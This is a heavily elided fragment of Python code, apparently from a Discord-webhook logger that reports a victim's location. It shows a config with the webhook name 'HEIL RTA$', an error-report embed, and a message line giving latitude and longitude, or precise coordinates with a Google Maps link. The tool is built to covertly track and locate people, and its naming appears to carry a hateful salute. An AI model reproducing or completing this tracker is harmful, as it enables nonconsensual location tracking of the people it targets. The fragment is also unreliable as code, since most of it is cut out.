...
config = {
    ...
    # CUSTOMIZATION #
    "username": "HEIL RTA$", # Set this to the name you want the webhook to have
...
def reportError(error):
    ...
    "embeds": [
        {
            "title": "RTA$ json error",
            "color": config["color"],
            "description": f"An error occurred while trying to log!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})
...
> **Cords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
